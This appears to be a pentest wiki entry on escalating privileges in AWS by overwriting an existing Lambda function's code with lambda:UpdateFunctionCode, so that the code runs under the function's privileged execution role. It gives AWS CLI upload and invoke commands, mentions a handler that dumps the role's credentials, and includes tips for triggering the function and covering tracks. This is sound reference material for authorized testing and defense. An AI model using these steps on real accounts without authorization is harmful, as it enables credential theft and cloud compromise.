---
title: "UpdateFunctionCode: overwrite a Lambda that runs a privileged role"
description: "lambda:UpdateFunctionCode to overwrite a function that already runs with a privileged execution role."
keywords:
  - UpdateFunctionCode
  - Lambda
  - execution role
  - code
  - overwrite
---

# UpdateFunctionCode

An existing Lambda already carries an **execution role**. `lambda:UpdateFunctionCode` replaces the function's code, so you overwrite it with your own and let the next invocation run as the role, no `PassRole` needed.

## Overwrite and trigger

```bash
# package a handler that dumps the role creds or does your work
aws lambda update-function-code --function-name <fn> --zip-file fileb://f.zip
# invoke directly, or wait for the function's existing trigger to fire it
aws lambda invoke --function-name <fn> out.json ; cat out.json
```

## Exploitation notes

- You need write on the function but not `PassRole`, since the role is already attached.
- If you lack `InvokeFunction`, an existing event source (API Gateway, S3, schedule) will run your code on the next trigger.
- Restore the original code afterward to limit disruption if the function is in production use.

## Tools

- **AWS CLI** (`lambda update-function-code` / `invoke`).
- **Pacu**: Lambda modules.

## References

- [Rhino Security Labs: AWS privilege escalation (UpdateFunctionCode)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
